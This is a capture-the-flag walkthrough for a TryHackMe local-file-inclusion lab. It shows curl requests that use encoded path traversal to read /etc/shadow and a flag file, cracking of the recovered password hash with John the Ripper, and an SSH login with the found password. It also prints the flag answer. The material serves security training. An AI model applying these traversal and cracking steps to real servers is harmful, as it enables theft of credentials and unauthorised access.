# [Day 15] LFI

## Instructions

Elf Charlie likes to make notes and store them on his server. Are you able to take advantage of this functionality and crack his password? 

Read the supporting materials [here](https://blog.tryhackme.com/lfi/).

## #1 - What is Charlie going to book a holiday to?

There is a web service running on default port 80/tcp. Let's see what the page looks like.

```php
$ curl -s 10.10.104.142
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<link rel="stylesheet" href="/css/bootstrap.min.css">
<link rel="icon" type="image/png" href="imgs/notepad.png"/>
<title>Public Notes</title>

  </head>
  <style>
    .jumbotron {
      background-image: linear-gradient(-90deg, rgba(0, 0, 0, 0.5), rgba(34, 40, 43, 0.6) 100%), url("imgs/lfi.png");
      background-size: cover;
      object-fit: cover;
      color: white;
      padding: 8px;
    }
  </style>
  <body>

    <div class="jumbotron text-center">
      <img src="imgs/notepad.png">
      <h1>Public Notes</h1>
      <p>A place to store and view all my notes in one centralised place</p>
    </div>

    <div class="container">
      <div class="row">
        <div class="col-sm-4">
          <h3>Note1: Jingle Bells Lyrics</h3>
          <p id='note-1'><i>Loading...</i></p>
        </div>
        <div class="col-sm-4">
          <h3>Note2: Presents Log</h3>
          <p id='note-2'><i>Loading...</i></p>
        </div>
        <div class="col-sm-4">
          <h3>Note 3</h3>
          <p id='note-3'><i>Loading...</i></p>
        </div>
      </div>
    </div>
    <script src="/js/jquery.min.js"></script>
    <script src="/js/bootstrap.min.js"></script>
    <script>
      function getNote(note, id) {
        const url = '/get-file/' + note.replace(/\//g, '%2f')
        $.getJSON(url,  function(data) {
          document.querySelector(id).innerHTML = data.info.replace(/(?:\r\n|\r|\n)/g, '<br>');
        })
      }
      // getNote('server.js', '#note-1')
      getNote('views/notes/note1.txt', '#note-1')
      getNote('views/notes/note2.txt', '#note-2')
      getNote('views/notes/note3.txt', '#note-3')
    </script>
  </body>
</html>
```

The page loads 3 notes using a javascript function (`getNote()`). This function is calling a web service and makes a request to `/get-file/<file_name>`. Below is an example to request the content of `views/notes/note3.txt` (notice that you have to encode `/` as `%2F`):

~~~
$ curl -s http://10.10.104.142/get-file/views%2Fnotes%2Fnote3.txt
{"success":true,"info":"To do list:\n\n[-] Take Santa sleigh in for an MOT\n[-] Improve security on file inclusion\n[-] Go food shopping\n[-] Book holiday to Hawaii\n"}
~~~

As shown in the response above, Charlie is planning to go on holiday to `Hawaii`.

## #2 - Read /etc/shadow and crack Charlies password.

The script is not sanitizing the user input and it is possible to request any file, including `/etc/shadow`:

~~~
$ curl -s http://10.10.104.142/get-file/..%2F..%2F..%2Fetc%2Fshadow
{"success":true,"info":"root:*:18152:0:99999:7:::\ndaemon:*:18152:0:99999:7:::\nbin:*:18152:0:99999:7:::\nsys:*:18152:0:99999:7:::\nsync:*:18152:0:99999:7:::\ngames:*:18152:0:99999:7:::\nman:*:18152:0:99999:7:::\nlp:*:18152:0:99999:7:::\nmail:*:18152:0:99999:7:::\nnews:*:18152:0:99999:7:::\nuucp:*:18152:0:99999:7:::\nproxy:*:18152:0:99999:7:::\nwww-data:*:18152:0:99999:7:::\nbackup:*:18152:0:99999:7:::\nlist:*:18152:0:99999:7:::\nirc:*:18152:0:99999:7:::\ngnats:*:18152:0:99999:7:::\nnobody:*:18152:0:99999:7:::\nsystemd-timesync:*:18152:0:99999:7:::\nsystemd-network:*:18152:0:99999:7:::\nsystemd-resolve:*:18152:0:99999:7:::\nsystemd-bus-proxy:*:18152:0:99999:7:::\nsyslog:*:18152:0:99999:7:::\n_apt:*:18152:0:99999:7:::\nlxd:*:18152:0:99999:7:::\nmessagebus:*:18152:0:99999:7:::\nuuidd:*:18152:0:99999:7:::\ndnsmasq:*:18152:0:99999:7:::\nsshd:*:18152:0:99999:7:::\npollinate:*:18152:0:99999:7:::\nubuntu:!:18243:0:99999:7:::\ncharlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::\n"}
~~~

Charlie's hash is:
~~~
charlie:$6$oHymLspP$wTqsTmpPkz.u/CQDbheQjwwjyYoVN2rOm6CDu0KDeq8mN4pqzuna7OX.LPdDPCkPj7O9TB0rvWfCzpEkGOyhL.:18243:0:99999:7:::
~~~

Let's crack it with John the Ripper:

~~~
$ /data/src/john-1.9.0-jumbo-1/run/john --wordlist=/data/src/wordlists/rockyou.txt shadow.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password1        (charlie)
1g 0:00:00:00 DONE (2020-05-03 11:42) 5.000g/s 5120p/s 5120c/s 5120C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

Charlie's password is `password1`

## #3 - What is flag1.txt?

You can get the flag by 2 ways: LFI and SSH.

### LFI

We can use the previous LFI vulnerability to read the flag as follows:

~~~
$ curl -s http://10.10.104.142/get-file/..%2F..%2F..%2Fhome%2Fcharlie%2Fflag1.txt
{"success":true,"info":"THM{4ea2adf842713ad3ce0c1f05ef12256d}\n"}
~~~

### SSH

As there is a SSH service running on default port 22/tcp, we can also get the flag using the credentials found previously:

~~~
$ sshpass -p "password1" ssh charlie@10.10.104.142 cat flag1.txt
THM{4ea2adf842713ad3ce0c1f05ef12256d}
~~~
